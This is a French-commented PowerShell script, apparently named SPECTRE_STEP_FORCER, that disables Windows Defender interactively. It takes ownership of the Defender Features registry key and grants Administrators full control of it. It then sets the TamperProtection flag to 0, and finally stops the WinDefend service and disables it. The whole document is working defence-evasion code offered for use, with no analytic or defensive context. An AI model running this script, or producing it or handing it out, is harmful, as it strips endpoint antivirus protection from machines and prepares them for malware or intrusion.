<#
.DESCRIPTION
    SPECTRE_STEP_FORCER
    Neutralisation interactive de la Tamper Protection et de WinDefend.
    Nécessite des privilèges Administrateur.
#>

function Confirm-Step {
    param([string]$Message)
    Write-Host "`n[?] $Message" -ForegroundColor Yellow -NoNewline
    $Action = Read-Host " (Y/N)"
    if ($Action -ne "Y") { Write-Host "[-] Etape abandonnee par l'utilisateur." -ForegroundColor Red; return $false }
    return $true
}

Write-Host "--- SPECTRE INTERACTIVE NEUTRALIZATION ENGINE ---" -ForegroundColor Cyan

# ETAPE 1 : Prise de possession (Ownership)
if (Confirm-Step "Tenter de prendre possession (Ownership) de la cle Features ?") {
    try {
        $RegPath = "SOFTWARE\Microsoft\Windows Defender\Features"
        $Key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($RegPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        $Acl = $Key.GetAccessControl()
        $Me = [System.Security.Principal.NTAccount]"Administrateurs"
        $Acl.SetOwner($Me)
        $Key.SetAccessControl($Acl)
        Write-Host "[OK] Propriete transferee au groupe Administrateurs." -ForegroundColor Green
    } catch {
        Write-Host "[!] ERREUR : Privilege insuffisant. Verifiez l'elevation." -ForegroundColor Red
    }
}

# ETAPE 2 : Modification des ACL (Permissions)
if (Confirm-Step "Accorder le FullControl sur la cle Features ?") {
    try {
        $Key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($RegPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        $Acl = $Key.GetAccessControl()
        $Rule = New-Object System.Security.AccessControl.RegistryAccessRule("Administrateurs", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $Acl.SetAccessRule($Rule)
        $Key.SetAccessControl($Acl)
        Write-Host "[OK] FullControl accorde." -ForegroundColor Green
    } catch {
        Write-Host "[!] ERREUR : Modification des ACL rejetee par le noyau." -ForegroundColor Red
    }
}

# ETAPE 3 : Neutralisation TamperProtection (Flag 0)
if (Confirm-Step "Bascule de TamperProtection a 0 (OFF) ?") {
    try {
        Set-ItemProperty -Path "HKLM:\$RegPath" -Name "TamperProtection" -Value 0 -Force -ErrorAction Stop
        Write-Host "[SUCCESS] Flag TamperProtection positionne a 0." -ForegroundColor Green
    } catch {
        Write-Host "[!] ECHEC : Verrou Kernel toujours actif." -ForegroundColor Red
    }
}

# ETAPE 4 : Desactivation du Service WinDefend
if (Confirm-Step "Stopper et desactiver le service WinDefend ?") {
    try {
        Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "WinDefend" -Force -ErrorAction Stop
        Write-Host "[OK] Service WinDefend neutralise." -ForegroundColor Green
    } catch {
        Write-Host "[!] ECHEC : Impossible de stopper le service. Verifiez la Tamper Protection." -ForegroundColor Red
    }
}

Write-Host "`n[*] Fin de sequence. Relancez SPECTRE_TAMPER_CHECK.PS1 pour validation." -ForegroundColor Cyan